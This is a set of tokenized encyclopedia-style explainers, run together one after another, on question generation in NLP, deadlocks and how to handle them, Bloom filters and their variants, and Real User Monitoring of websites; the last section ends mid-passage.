Du et al .
adopted the encoder - decoder architecture of a seq2seq model .
Decoder was an LSTM that generated the question .
Both an input sentence and its containing paragraph were encoded via separate BiLSTM and then concatenated .
Via an attention layer , the decoder learned to pay attention to more relevant parts of the encoded input representation .
Encoders and decoders had two layers each .
Later models included target answer at the input to avoid questions such as " What is mentioned ?
" Position embeddings may be used to give more attention to answer words closer to context .
Some decoders predict question words ( when , how , why , etc .
) before generating the question .
Seq2seq models struggle to capture the paragraph - level context that 's needed to generate high quality questions .
Zhao et al .
extended the seq2seq model with answer tagging , maxout pointer mechanism and a gated self - attention encoder .
Another approach uses multi - stage attention .
Transformer - based models also capture longer context .
One research pre - processed the input with NER .
Other models have adapted BERT and GPT-2 for QG .
How is question answering relevant to question generation ?
About 2000 - 2010 , interest in QG was to aid QA systems .
Later , motivated by applications , QG became an important task on its own .
However , the synergy between QG and QA continues .
In 2017 , papers were published that showed that QG and QA are dual tasks .
Similarly , visual QG and visual QA are considered dual tasks .
Joint probability between questions and answers can be applied .
The probabilistic correlation between QA and QG can be used to regularize the training process .
The A QA model evaluates if a question generated by a QG model can be answered .
A QA - specific signal feeds into the QG loss function .
The QG model estimates the probability of a question given the answer , which helps QA .
It 's possible to simultaneously train both models .
Tang et al .
used seq2seq model for QG and RNN for QA .
For supervised training of any end - to - end QA model ( using neural networks ) , we require lots of training data .
Where data is limited , QG helps by automatically creating questions from any given input .
Duan et al .
achieved this by crawling through community - QA websites such as Quora or Yahoo!Answers .
They also generated questions from passages using CNN and RNN .
Which datasets are useful for building QG models ?
QG datasets compared .
Source : Pan et al .
2019 , table 1 .
Datasets assembled for Question Answering ( QA ) or Machine Comprehension ( MC ) can be reused in QG .
For example , MC datasets typically have document - question - answer triples with the goal of predicting the answer .
QG models are instead trained to predict the question .
WikiQA is a text - based dataset .
WebQuestions and SimpleQuestions are knowledge - based datasets .
SQuAD and MS MARCO are for MC .
SQuAD has 150 K question - answer pairs and another 50 K questions without answers .
NewsQA has 120 K question - answer pairs gathered from CNN news .
Based on Freebase , one corpus has 30 M factoid question - answer pairs .
SciQ has 13.7 K MCQs in biology , chemistry , earth science , and physics .
Some of these datasets were crowdsourced via Amazon Mechanical Turk ( AMT ) .
Specifically for QG , QG - STEC dataset was created in 2010 .
It has 180 questions about sentences and 390 questions from paragraphs .
Medical CBQ is a corpus for the medical domain .
MCQL has 7.1 K MCQs from web crawling on topics of biology , physics , and chemistry .
For non - factoid questions , community - driven question answering websites could be harvested for a large volume of training data .
Yahoo!Answers and Quora are examples .
How can I evaluate question generation models ?
Various criteria for human evaluation of QG systems .
Source : Amidei et al .
2018 , table 7 .
Intrinsic evaluation analyzes the QG model 's output based on criteria such as grammaticality or fluency .
Extrinsic evaluation is about measuring system or application performance in which the QG model is used .
The trend has been towards automatic and intrinsic evaluation .
However , there 's no common framework that makes it easy to compare different QG models .
Suppose students ' language proficiency is evaluated from two sets of questions , one machine - generated and the other human - generated .
This is an extrinsic evaluation .
Instead , if experts subjectively evaluate the machine - generated questions , it 's an intrinsic evaluation .
With human evaluation , criteria to consider are relevance , syntactic correctness , fluency , ambiguity , question type , and variety .
These are quality judgements .
It 's also important for annotators to agree with one another .
For automatic evaluation , ROUGE , precision , recall , and F1 are some useful intrinsic metrics .
Perplexity based on a language model is a metric to measure fluency .
In general , models with high scores could perform poorly on human evaluation .
Question answerability may be a better metric compared to n - gram similarity metrics such as BLEU , METEOR , NIST .
Chomsky 's Subject Condition with examples .
Source : Bach and Horn 1976 , sec .
4 .
In an article titled Conditions on transformations , Chomsky proposes a linguistic approach in which questions are really transformations of canonical declarative sentences .
Mitkov and Ha generate multiple choice questions using " transformational rules , a shallow parser , automatic term extraction , word sense disambiguation , a corpus and WordNet " .
Sentences with domain - specific terms are considered for question generation .
Distractors are selected to be semantically close to the correct answer .
For example , if the correct answer is ' syntax ' , ' semantics ' and ' pragmatics ' are better choices than ' football ' or ' chemistry ' .
An example rule is to generate " Which HVO " ( H for hypernym ) for an SV - type sentence .
Echihabi and Marcu generate factoid question - answer pairs by mining structured or semi - structured databases such as World Fact Book , Biography.com or WordNet .
They apply extraction patterns from information retrieval to manually define template pairs .
However , their end goal is not question generation but question answering .
In fact , research on question generation in this decade is mostly motivated by the task of question answering .
QG differs for narrative and informational texts .
Source : Chen et al .
2009 .
Chen et al .
note that self - questioning improves reading comprehension among learners .
In this context , they automatically generate questions from natural text .
However , narrative text is different from informational text .
The former involves characters , behaviour and mental states .
The latter involves descriptions and explanations .
For each question type , they use rules and question templates .
Their approach uses Semantic Role Labelling ( SRL ) .
Lindberg et al .
( 2013 ) also uses SRL and templates .
Steps in a rule - based QG system .
Source : Heilman and Smith 2010 , fig .
1 .
Heilman and Smith propose a rule - based QG system for generating factoid questions .
Rules are based on linguistic knowledge .
The rules are generic and not dependent on sentence types .
Their two - step process first simplifies the input sentence and then transforms it into a question .
Answer phrases ( noun phrases or prepositional phrases ) are identified and then replaced with question phrases .
They over - generate questions and then rank them using a logistic regression model .
Following the annual tasks run by CoNLL , the first Shared Task Evaluation Challenge on Question Generation ( QG - STEC ) is organized .
Although inspired by NLG , researchers note that QG is currently seen as a discourse processing task rather than an NLG task .
This shared task aims to provide questions in an application - independent manner based on core ideas in the input text .
They focus on two categories : QG from sentences and QG from paragraphs .
For the latter , questions are of the type " who , where , when , which , what , why , how many / long , yes / no .
" Input sources are Wikipedia , OpenLearn , and Yahoo!Answers .
While previous research work mostly considered sentence - level context , Agarwal et al .
consider paragraph - level context .
Discourse connectives connect two clauses or sentences to establish temporal , causal , elaboration , contrast , or result relations .
They make use of these connectives to identify question types and generate questions of the type " why , when , give an example , and yes / no " .
They use QGSTEC-2010 and Wikipedia datasets .
Architecture of the topic - to - question generation system .
Source : Chali and Hasan 2015 , fig .
1 .
Chali and Hasan propose topic - to - question generation in which input texts are about a specific topic .
Generated questions are therefore topic - focused .
Named entities , semantic role labels and predicated argument structures are used to generate questions .
Using Latent Dirichlet Allocation ( LDA ) , they identify sub - topics to rank questions by relevance .
They also evaluate the syntactic correctness of generated questions .
They argue that this approach enables a QA system to answer complex questions with simpler questions .
Feature - rich encoder and attention - based decoder in a seq2seq QG model .
Source : Zhou et al .
2017 , fig .
1 .
Sequence - to - sequence neural network models with attention , first applied to machine translation in 2014 , is applied to the task of question generation .
In one approach using BiLSTM , attention - based sentence encoder and paragraph encoder are used .
Input could include rich features such as POS and NER tags .
Another research includes pointer - softmax to include in the question relevant words from the input .
The model considers both input documents and answers .
It also applies reinforcement learning by feeding the questions to a QA system .
Joint training of QA and QG .
Source : Tang et al .
2018 , fig .
1 .
Tang et al .
explore how QG and QA models can be jointly trained .
In particular , the policy gradient method can be used to update the QG model based on QA - specific signals .
They apply Generative Adversarial Network ( GAN ) to generate question - answer pairs .
A collaboration detector ( CD ) determines positive versus negative training instances .
In their QG model , they adapted the seq2seq model to Table2Seq .
Table headers , cells , and captions are encoded into continuous vectors using Bidirectional GRU .
Decoder uses attention - based GRU with a copying mechanism .
LearningQ contains better training examples .
Source : Chen et al .
2018 , table 1 .
Chen et al .
note that the Stanford Question Answering Dataset ( SQuAD ) and RACE datasets were collected for reading comprehension and not suited for assessing higher cognitive skills such as applying or analyzing .
They address this by creating LearningQ , a dataset of 230 K document - question pairs from online learning platforms .
Dataset uses TED - Ed and Khan Academy as sources .
They show that QG models that currently do well on other datasets are challenged by LearningQ. Architecture of BERT - HLSQG .
Source : Chan and Fan 2019 , fig .
4 .
Chan and Fan use BERT for QG .
Their simplest model uses only context and answers as inputs .
It performs poorly because it does n't leverage previously decoded tokens , unlike seq2seq models .
They therefore propose BERT - HLSQG that marks the answer in context plus feeds in previously decoded answer tokens .
This model achieves state - of - the - art results on SQuAD .
A two - process deadlock .
Source : Harvard 2018 .
Deadlock is a problem that can occur when resources are shared among multiple processes .
Suppose process P1 is waiting for a resource R1 currently being used by process P2 .
Meanwhile , P2 is waiting for resource R2 that 's being used by P1 .
Neither process is able to proceed .
This is an example of deadlock .
Shared resources could be files , database tables , memory , peripherals ( printers , tape drives ) , network , etc .
While we commonly talk of deadlocks among processes , it could be among threads , users , transactions , computers in a distributed system , etc .
While it 's possible to design systems completely free of deadlocks , it 's inefficient not to share resources or avoid multiprocessing .
Instead , there are techniques to avoid , detect and recover from deadlocks .
Could you explain deadlocks with an example ?
Five philosophers ( processes ) shared resources ( forks ) .
Source : AIIMS 2013 , slide 3 .
In real life , traffic deadlocks can occur at intersections .
In computer science , the classic example used to illustrate deadlock is the Dining Philosophers Problem .
Five philosophers are seated at a round dining table .
There are five forks , each placed between two philosophers .
Philosophers alternate between eating and thinking .
To eat , a philosopher has to acquire both forks on either side of his plate but acquire them one at a time .
Once a philosopher successfully gets both forks , she eats for a while , then puts down both forks and thinks for a while .
Now her neighbouring philosophers can acquire one of the released forks and start eating if they already have another fork .
A deadlock can occur when each philosopher acquires one fork and waits indefinitely for another fork .
Thus , no philosopher can start to eat .
They 'll wait forever , neither eating nor thinking .
In this analogy , philosophers are the processes .
Forks are shared resources .
If resource sharing is poorly coordinated , deadlocks can occur .
The system stalls .
No useful work gets done .
What are some areas in computer science where deadlocks can occur ?
Locks on database tables can create a deadlock .
Source : Apache Software Foundation 2020 .
Deadlocks can occur in database applications .
For example , two transactions have locks on two different tables but also require access to the other table .
This happens because operations within one transaction execute between operations of the other transaction , something that 's common in concurrent systems .
The problem is worse when databases are distributed .
Deadlocks can occur in multithreaded applications or multiprocessing systems with shared resources .
For example , one process is reading a file and then attempting to print the file .
However , another process is using the printer and suddenly wants access to the file held by the first process .
Both processes are now deadlocked .
Exclusive access to a resource is typically implemented as a lock or mutex .
The term mutex is common when accessing critical sections of code .
The term lock is common in databases .
Which are the necessary conditions for a deadlock to arise ?
There are four necessary conditions for a deadlock : Mutual Exclusion : A resource ca n't be assigned to more than one process at a time .
Hold - and - Wait : A process that 's holding a resource is also waiting for another resource .
No Pre - emption : A process that 's holding a resource ca n't be forced to or does n't voluntarily give up that resource .
Circular Wait : Each process is waiting for a resource held by another process .
This condition implies the hold - and - wait condition .
How do I analyze or visualize a deadlock ?
Resource allocation graphs .
Source : Adapted from Bell 2006 , figs .
7.2 - 7.3 .
Resource allocation graphs help us understand or analyze deadlocks .
Resources and processes are the nodes of the graphs .
Directed edges connect the nodes .
A directed edge from a resource to a process implies that the resource is assigned to that process .
A direct edge from a process to a resource implies that the process is requesting that resource .
Where there are multiple instances of a resource , a request edge terminates at the edge of the resource box .
On the other hand , an assignment edge always terminates an instance .
Each instance is represented as a dot within the resource box .
In the figure we note two examples .
Both have circular waits but only one of them is a deadlock .
In sub - figure ( b ) , P1 and P3 are waiting for R1 and R2 respectively .
However , instances of R1 and R2 will become available once released by P2 and P4 respectively .
There 's no deadlock since P2 and P4 are not part of the circular wait and neither do they fulfil the hold - and - wait condition .
What are some techniques to handle a deadlock ?
Techniques for handling system deadlocks .
Source : Isloor and Marsland 1980 , table 1 .
The four common ways to handle deadlocks are : Prevention : A system is designed with constraints to prevent at least one of the conditions required for a deadlock .
Avoidance : Algorithms decide at runtime to deny a resource request if subsequent requests might lead to a deadlock .
Decisions may be conservative , resulting in lower resource utilization .
Detection : Periodically check for deadlocks .
Frequent checks imply a performance overhead .
Infrequent checks imply deadlocks are not caught soon enough .
Use triggers such as a drop in CPU utilization to start a check .
Perhaps check when a resource request ca n't be granted .
Recovery : Take action to break one of the conditions for a deadlock .
One of the processes could be terminated , called victim selection .
Or the process is forced to release resources it holds .
Deadlock prevention is easier than deadlock detection .
For example , in the Dining Philosophers Problem , a simple rule will prevent deadlocks : given that the forks are numbered , each philosopher must first pick the lower - numbered fork before attempting to pick the higher - numbered fork .
Which are some concepts closely related to deadlock ?
Blocking calls can lead to communication deadlocks .
Source : Anthony 2016 , fig .
3.40 .
While we often talk about processes blocked on resources , there are also communication deadlocks .
In these cases , processes are waiting for messages from other processes .
If two processes are waiting for each other for messages , they 're in a communication deadlock .
For generalization , we could consider messages as resources .
Communication deadlocks are possible in distributed databases where a transaction requests some nonlocal data and is blocked until a response arrives .
Sometimes the system is not in a deadlock but work is not going or progressing slowly .
For instance , a process is unable to obtain a resource for long periods of time , while other processes easily obtain the same resource , perhaps because they have a higher priority .
This is called starvation .
Another problem is when processes are doing something , such as continually responding to each other or changing states , but not getting their tasks done .
This is not a deadlock since processes are still running .
It 's called a livelock .
As a developer , what best practices should I follow to prevent deadlocks ?
To prevent deadlocks , request all the necessary resources together .
In other words , a process is not allowed to obtain one resource and then request another .
If for some reason a process holds a resource and its request for another resource is denied , it must give up the first resource .
Another best practice is to impose a linear order in which resources must be requested .
For example , always request file access before a printer accesses .
Impose a constraint that a process can hold at most one lock at a time .
It 's also been said , " never call other people 's code while holding a lock " , unless that code does n't acquire a lock .
To share resources , prefer alternatives to mutexes or locks .
The resource could be replicated .
Use a higher - level pattern to synchronize operations .
For instance , the pipeline pattern serializes accesses without using mutexes .
To prevent communication deadlocks , at least one process must use non - blocking IO .
An alternative is to use separate threads for send and receive operations , so that the process can still send messages while blocked on the receiving thread .
E. J. Braude publishes an IBM technical report titled An algorithm for the detection of system deadlocks .
Deadlock due to improper memory allocation .
Source : Dijkstra 1968 , pp .
74 .
In his paper titled Co - operating sequential processes , Dijkstra explains mutual exclusion and the use of semaphores or status variables to solve this .
He then points out that the problem of deadlock , though he uses the term deadly embrace instead .
He gives an example of processes holding some memory and requesting more memory , leading to a deadlock .
He proposes the Banker 's algorithm as a method to avoid deadlocks .
Some IBM publications describe the problem of deadlocks observed in ASP / OS/360 .
For example , when spooling disk space is full with input and output records , an input process and an output process can both wait for more disk space .
Deadlocks could be avoided by rejecting new jobs once spool utilization reaches 80 % ; or cancelling a blocked job after a defined timeout .
Deadlock is inevitable once a system enters region D. Source : Coffman et al .
1971 , fig .
2 .
Coffman et al .
introduce the four necessary conditions for a deadlock .
In time , these are called Coffman conditions .
They also present sequence and state diagrams to explain deadlocks .
Within the ARPA network ( precursor to the Internet ) , deadlocks are being observed as resources are shared over the network .
Robert Chen notes that the deadlock problem in networks requires a different approach from deadlocks on resources managed by a single operating system .
In a message - switched system , a message travels through many store - and - forward buffers .
A buffer ca n't be released until the message is transferred to the next buffer along the route .
Deadlocks are more easily realizable ( reachable from an empty system state ) if routes are fixed and less realizable if alternative routes ( free buffers ) can be found .
A wait - for - graph model for distributed databases .
Source : Knapp 1987 , fig .
1 .
Edgar Knapp writes about deadlocks in distributed databases .
He presents different models of deadlocks and various deadlock detection algorithms .
He models resource requests using what he calls a wait - for - graph ( WFG ) .
In the figure , the circles are nodes .
Node t11 has two outstanding requests to t21 and t31 .
The cycle t11-t31-t33-t43-t41-t11 is in fact a deadlock .
Mukesh Singhal extended this work in November 1989 .
Bloom filter on k - mers in biological sequence analysis .
Source : Pellow et al .
2017 , fig .
1 .
Given a set of elements , suppose we wish to know if a particular element is present in this set .
There are many research algorithms to do this .
When faced with a huge set ( millions of elements ) , even with an efficient search algorithm , storage is a problem .
There 's also latency due to disk access .
Bloom filter is one possible solution .
Bloom filter is a data structure that stores the original set in a more compact form with support for set membership queries , that is , to query if an element is a member of the set .
Bloom filter is a space - efficient probabilistic data structure .
With the rise of big data since the mid-2000s , there 's been increased interest in Bloom filter .
From the original Bloom filter ( 1970 ) , many variants have been proposed for a diverse range of applications .
Could you explain the Bloom filter with an example ?
Bloom filter with m=12 and k=3 .
Source : Luo et al .
2019 , fig .
2 .
A Bloom filter is simply a bit array of length \(m\ ) for storing elements of set \(S=\{x_1,x_2,\ldots , x_n\}\ ) .
The filter starts with all zeros , meaning that the set is empty .
When an element is added , it is hashed using \(k\ ) independent hash functions .
Each function will output a bit position in the filter , which is then set to one .
Thus , each element will set \(k\ ) bits of the filter .
When a query is made , the queried element is put through the \(k\ ) hash functions .
The resulting bit positions are checked in the filter .
If at least one of these is a zero , we 're certain that the element is not in the set .
If all bits are one , then it may be in the set .
Thus , the filter is probabilistic .
The reason it 's probabilistic is that a query may check against bit positions set by more than one stored element .
In the figure , we can say that \(x_4\ ) is definitely not in S but \(x_1\ ) ( true positive ) and \(x_5\ ) ( false positive ) are most probably in S. Under what conditions can I use the Bloom filter ?
Suppose the records of a large database table are stored on disk and need to be queried .
To avoid slow disk access , a Bloom filter representation of the data is kept in fast memory .
If the Bloom filter says that a record is absent , we 're sure that it 's absent and avoid disk access .
If the Bloom filter says the record is present , we 're not sure .
We need to query the database to find out .
A false positive is when the filter says something is present when it 's not .
False positives should be at a level acceptable to the application .
When most queried records are absent in the database , Bloom filter gives performance gains .
Back in 2003 , Broder and Mitzenmacher stated the Bloom filter principle . Wherever a list or set is used , and space is at a premium , consider using a Bloom filter if the effect of false positives can be mitigated .
Multiple elements can be set the same bit in the filter .
Therefore , elements once added ca n't be removed from the filter .
Neither can we obtain the list of elements added .
The standard Bloom filter is not suited for applications that need these features .
How do I select the parameters of the Bloom filter ?
There are essentially three parameters : filter size \(m\ ) , number of hash functions \(k\ ) and number of elements to be stored \(n\ ) .
For lower false positives , use higher values of \(m\ ) and \(k\ ) with a tradeoff .
Higher \(m\ ) means more memory consumption .
Higher \(k\ ) means more computation .
Since higher \(k\ ) sets more bits , there 's an optimal value \(k_{opt}\ ) beyond which false positives start to increase .
When adding elements beyond the design limit , false positives go up .
To achieve a fixed false positive probability , we should linearly scale \(m\ ) as \(n\ ) increases .
In fact , the bit - to - element ratio is bounded as \(m / n\geqslant1 / ln(2)\ ) .
In practice , we estimate \(n\ ) in advance for our application .
We decide on the false positive probability we 're willing to tolerate .
We select \(m\ ) and calculate \(k\ ) , or select \(k\ ) and calculate \(m\ ) .
A handy calculator is available online .
If parameters are not chosen correctly , an attacker can corrupt the filter with well - chosen inputs .
Which hash functions are suitable for use in a Bloom filter ?
Hash functions should ideally be independent , meaning that for the same input they set different bits of the filter .
Otherwise , hash collisions become more common , leading to higher false positives .
Functions should also distribute the input space uniformly .
Hash functions should be fast .
The use of cryptographic hash functions is possible but not really required .
Among the non - cryptographic hash functions suited for Bloom filter are MurmurHash , Fowler – Noll – Vo ( FNV ) and Jenkins .
One developer showed how replacing MD5 with MurmurHash brought performance improvements .
It 's possible to generate \(k\ ) hash functions from just two hash functions .
One researcher pointed out that if the filter size is 32 bits , on a 64-bit machine , a single hash function can give two 32-bit hash values , thus simulating two hash functions .
Which are some real - world applications of the Bloom filter ?
Some applications of Bloom filter .
Source : Patgiri et al .
2019 , fig .
5 .
For network - related applications , Bloom filter is used to collaborate in peer - to - peer networks , resource routing , packet routing , and measurements .
Content Delivery Networks ( CDNs ) use Bloom filters to avoid caching files seen only once .
For applications that use databases , Bloom filter enables efficient searches , privacy preservation , content synchronization , and duplicate detection .
Medium uses Bloom filter to deduplicate recommendations .
In a streaming application processing 17 million events per day per partition , Bloom filter was used to deduplicate events at scale .
The filter needed 108Gb across 1024 parts .
Reads and writes were 20x and 3x faster , respectively .
The Chrome browser uses the filter to represent a set of malicious URLs .
When a user requests a URL , if the filter indicates a probable match , the request is sent to a server to check if the URL is indeed safe .
In a web application , Bloom filters could be used to keep count of visitors coming from a specific city accessing a webpage .
How 's the performance of the Bloom filter ?
False positive rate ( FPR ) of the Bloom filter .
Source : Tarkoma et al .
2012 , fig .
3 .
A Bloom filter with one hash function is equivalent to ordinary hashing .
Bloom filter is a generalization of hashing .
It allows for more interesting design tradeoffs .
The complexity of adding an element or querying the filter is fixed at \(O(k)\ ) .
In other words , it 's independent of how many items have been added to the filter .
Bloom filter simplifies some operations .
Suppose we have two filters to represent sets \(S_1\ ) and \(S_2\ ) .
The union of these two sets is simply an OR operation of the two filters .
The intersection of the two sets can also be approximated with the filters .
Another trick is to half the size of the filter with an OR operation of the first and second halves of the filter .
What are some variants of the Bloom filter ?
Bloom filter variants and their features .
Source : Tarkoma et al .
2012 , table II .
Bloom filter has inspired dozens of variants .
One survey paper from 2019 mentioned more than 60 variants , their capabilities , performance and application areas .
A variant might aim to reduce false positives , improve performance or provide additional features .
Counting Bloom filter allows us to implement a multiset so that multiple instances of the same element can be stored .
Some of these support deletions as well , but at the cost of false negatives .
Bitwise Bloom filter and spectral Bloom filter improve the counting Bloom filter .
When elements are added to a filter beyond its designed capacity , false positives increase .
The Scalable Bloom filter allows us to grow the filter size as more items are added .
When filters have to be exchanged over a network ( such as in web caching applications ) , the Compressed Bloom filter saves network bandwidth .
By choosing the hash functions and thereby changing the way bits are distributed in the filter , better compression is achieved .
Could you mention some useful resources on the Bloom filter ?
Survey paper by Luo et al .
( 2019 ) is worth reading .
Jason Davies has published online an interactive visualization of the Bloom filter .
The JavaScript code for this is also available .
The C++ library libbf contains implementations of the Bloom filter and some of its variants .
A Java implementation of the filter ( and other probabilistic data structures ) can be found within stream - lib .
Guava library in Java also has an implementation .
Packages offering the filter are available in Python as well as in Node.js .
In the construction of a symbol table in compiler design , Batson describes a method that means faster search for symbols .
Rather than doing a slow linear lookup , an arithmetic transformation is done on the symbol .
The result gives the address where the symbol will be stored ( or retrieved ) on the table .
The term hashing became common in the late 1960s for this sort of transformation on the input .
As hash area increases , errors and disk access decrease .
Source : Bloom 1970 , table I. Burton H. Bloom publishes a paper titled Space / Time Trade - offs in Hash Coding with Allowable Errors .
In conventional hash - coding methods , many lookups are needed when an element does n't belong to the set .
He therefore proposes a novel method to reduce the reject time , time taken to declare that an element is a non - member of the set .
To allow for smaller hash area , he accepts some fraction of errors .
With smaller hash area , hashes can be stored in the core memory for faster access .
Fan et al .
propose the Counting Bloom Filter in the context of web proxy caching .
Since caches have to be updated , they find it necessary to keep a count of how many times a bit position in the filter has been set .
They propose 4 bits per filter bit while keeping false negatives low .
When a request comes in , the proxy checks its own cache .
If absent , it checks the Bloom filters of participating proxies .
Based on the result , it decides whether to query another proxy .
Bloom filters are updated among proxies based on defined thresholds .
Shanmugasundaram et al .
propose the Hierarchical Bloom Filter to address the problem of substring matching .
In addition to the substrings , the filter also stores concatenation of substrings , thus creating an hierarchy .
It 's applied in the context of IP traffic to attribute payloads to source and destination hosts .
Borrowing from standard hashing , Kirsch and Mitzenmacher propose how to simulate multiple hash functions for the Bloom filter from just two independent uniform random hash functions .
Their \(k\ ) hash functions are of the form \(g_i(x ) = h_1(x ) + i \cdot h_2(x)\,mod\,p\ ) , for \(i\ ) in range \([0,k-1]\ ) and where \(p\ ) is prime , the filter has \(kp\ ) bits and each function has range \([0,p-1]\ ) .
Almeida et al propose the Scalable Bloom Filter .
Sometimes it 's difficult to estimate upfront the maximum number of elements that need to be stored in a Bloom filter .
Designers therefore tend to waste space by overestimating , sometimes by orders of magnitude .
By allowing the filter size to scale dynamically , the scalable Bloom filter guarantees that false positives do n't exceed a defined design threshold .
It 's parameterized by initial size , error probability , growth rate and error probability of tightening rate .
Bose et al .
observe that the original analysis of false positive rate by Bloom and others is not exact .
This gives an exact formula for the false positive rate plus lower and upper bounds .
The rate is slightly larger than originally calculated , but the difference is negligible for large \(m\ ) and small \(k\ ) .
Neural Bloom Filter architecture .
Source : Rae et al .
2019 , fig .
1 .
Rae et al .
propose the Neural Bloom Filter that uses an artificial neural network with one - shot meta - learning .
Softmax is computed on content - based attention between the query q and a learned address matrix A. Thus , the network learns where to store elements based on their content .
This is more space - efficient but at the cost of performance for a single query .
It outperforms the standard Bloom filter on batch queries parallelized on GPUs .
Real User Monitoring .
Source : eGInnovations 2020 .
Websites and mobile applications are constantly looking to improve end user ’s experience with their product , be it stability , performance or usability .
By passively observing every user ’s interaction with the application , product teams can get deep insights into the user experience and take corrective action .
This passive monitoring process is called Real User Monitoring ( RUM ) or End User Monitoring .
Traditional methods of Application Performance Management focus on downtime or response time .
These are from a product features perspective rather than an end - user perspective .
RUM gives a transparent , real - time view of every single user transaction for IT managers to pre - emptively detect and resolve user issues .
RUM tools typically insert small bits of JavaScript code into the client application for continuous data collection .
Events such as DNS resolution , TCP connect time , SSL encryption negotiation , first - byte transmission , navigation display , page render time , TCP out - of - order segments , and user think - time are monitored .
What are the key defining features of RUM ?
Data Visualization in RUM .
Source : Hadžić 2020 .
User Journey Mapping - Study of user interactions with product at various stages of familiarity with the product ( User Lifecycle ) .
Intuitive analysis to understand each user action and the motivation behind those actions .
Trace user movement within the product – what they like to do , where they falter , what features they avoid , why they exit .
Real - time Alerts - Using AI based analysis , problems detected in the user session are compiled into actionable notification alerts , even while the user session is in progress .
Example alert – “ Error rate has been up for over 10 hours on the check - out page of ecommerce app ” .
Individual User Session Monitoring - Collection of chronological events for a particular end user from the start of a web session to a configurable period of inactivity .
During each user session , pages / components are visited and timing information is collected .
Data Visualization and Analysis - RUM collects data points from a high volume of users over a wide range of metrics .
Visualizations such as bar graphs , time series charts and area graphs make these large volumes of data human - readable .
Actionable insights can be derived from the data .
What are the objectives of performing RUM ?
RUM is generally used by product managers and owners to discover key bottlenecks to meeting their business objectives – ROI , trial to subscription conversion rates , app downloads / uninstall rates and so on .
By closely observing how users navigate their way through the app / website , it is possible to unearth the specific reasons for poor user engagement .
RUM helps meet the following objectives : debugging a user ’s navigation path in case of failed operations to surfacing hidden problems .
Why does a user experience slow page load times - browser , network , server , or content download that takes more processing time ?
Real - time measurement of key targets by tracking actual visits and delivering top - level data on actual use cases .
Collect UX metrics such as NPS ( Net Promoter Score ) , Usability Scale , App ratings , Time on Task , Click to Action .
User segmentation and testing based on actual operating system , browser , user location , language , device or network settings .
Helps with troubleshooting deployment specific issues .
How is RUM different from web analytics mechanisms such as Google Analytics ?
RUM and analytics tools like Google Analytics serve different purposes .
Analytics are for collecting high level performance data from a product perspective .
They do not focus on individual user experience at all .
These tools aggregate trends captured across web sessions and show them up as performance statistics .
For example , collect traffic data across the span of a single day , a week or a month .
For high traffic scenarios , analytics tools use sampled traffic data for reporting purposes .
The main purpose of Google Analytics is to collect and analyse web data for SEO , lead generation and conversion tracking , from a marketing perspective .
RUM instead focuses more on the actual root causes of performance issues that users may experience .
It is impossible to debug issues faced by an individual user using analytics .
Or verify feature implementation across product versions .
RUM enables monitoring of user sessions across deployed devices / browsers or tracing unhandled exceptions in a particular crash scenario .
RUM captures 100 % webpage hits , thus giving a very clear and close view of the user – product relationship .
Analytics is meant to be a post - mortem of web activity , whereas RUM is about real - time analysis and rectification .
What is synthetic monitoring and how does it compare with RUM ?
Synthetic monitoring is the process of analysing a website ’s user experience and performance without actual users , instead by simulating them .
It is especially effective in the pre - deployment phase , during in - house testing before going live .
It 's essential for load testing of high - traffic websites .
Synthetic monitoring can answer queries such as : Is my website up and running ?
Are response times acceptable , especially with high load ?
Are all transactions working ?
If there is a slow down or failure , where is it in the infrastructure ?
Are my third party components operating correctly ?
What is the performance versus cost ?
Unlike RUM , synthetic monitoring can not be used to find what the real user is experiencing .
In real - time deployment scenarios , synthetic test cases may all pass , but a real user might still face transaction outages or speed issues .
This can be identified only using RUM .
It ’s almost impossible to simulate practical failure cases such as those related to geographical location access , specific user device settings , unexpected network outage .
The general practice is to run synthetic monitoring test cases before going live , and real user monitoring after live deployment , at regular intervals .
The two methods complement each other .
How is an RUM solution deployed ?
RUM - Full Stack Deployment and Analytics .
Source : Dynatrace 2017 .
RUM tool usage is divided into two phases – Deployment and Execution .
During deployment , two steps are done : JavaScript code RUM integration with client - side product code Install RUM agent on target server on all deployed systems .
It discovers all technologies and applications running on it ( JS , PHP , IIS , .Net ) . RUM tool deployment requires a full stack of development skills .
Now the tool is ready for usage .
Its execution is navigated from the tool dashboard .
User - specific access level permissions control data access .
What is the typical execution process flow for RUM ?
Data Collection - captures data about requests for pages , JSON , and other resources from browser to web servers , even when requested content is hosted on third - party sites .
User Session Analysis - captured data regrouped into a session - wise record of pages , components , timing information .
User journey analysed for registered / anonymous users , new / recurring users .
JavaScript errors checked for show stoppers or mild irritants .
User Performance Analysis – Various response times as perceived by users are studied at the front / back end .
Metrics are optimised as per user bandwidth availability .
User Behavior Analysis – Frequent user activities , entry / exit actions , landing pages , last page viewed before exit , bounce rate , user leaving app after first visit are studied .
Problem Detection - undesirable behaviour such as slow response time , system problems , page load errors , transaction failures , web navigation errors , analyzed for different pages , objects , sessions .
The AI - powered Root Cause Analysis - DevOps team performs RCA and maps user issues with underlying root cause .
The analytics model understands the context of each metric .
Reporting and Notification - Various data visualization formats and problem reports can be accessed .
When data points cross configured thresholds , notification alerts can be configured to be sent .
What are the popular RUM tools used ?
RUM Dashboard .
Source : GeekFlare 2020 .
RUM tools are testing and analysis platforms that enable product teams to study whether applications are working as per their intended design .
RUM tools are generally deployed within the product environment by embedding JavaScript snippets into product code .
They are not plug and play tools , they require code - level integration with the product .
Most of the tools support React , AJAX , AngularJS web applications .
For RUM on mobile apps , code is embedded into the app source code for Android / iOS apps .
The RUM tool dashboard can then be used to monitor user sessions in real - time and observe key metrics such as page rendering time , environment specific performance , error rates , and bounce rates .
Alert notifications can be set for key touch - points .
Some tools also support Single Page Application monitoring ( where web apps dynamically rewrite current page content itself every time , instead of loading new pages for every operation ) .
Such apps mostly use AJAX requests to pull content dynamically and create a fluid user experience .
Some of the popular RUM tools include Sematext , Monitis from TeamViewer , SmartBear , Dynatrace , SOASTA mPulse from Akamai , Raygun , AppDynamics from Cisco , and CXOptimize by Cognizant ( Open Source ) .
What are the limitations and concerns to using RUM ?
RUM is useful in several scenarios , but has some limitations .
There are also concerns about performance overhead and security .
Some are listed below : Not effective with limited traffic – Before product launch or just after launch , websites / apps do n’t generate much traffic .
RUM would not detect any meaningful issues at this stage .
It works best when there is steady traffic volume .
Generates too much data - Ironically , during heavy usage , a large number of datasets are collected .
Small companies wo n't have sufficient DevOps resources to analyse this .
Trial and error visible to users - Synthetic monitoring is done using simulated environments without involving the actual user .
Whereas , RUM tool runs in the actual production environment .
If issues are found regularly , users would notice frequent product updates .
Products may appear immature .
Exposure risk at code level - Product teams must be careful before integrating RUM script code into product source code .
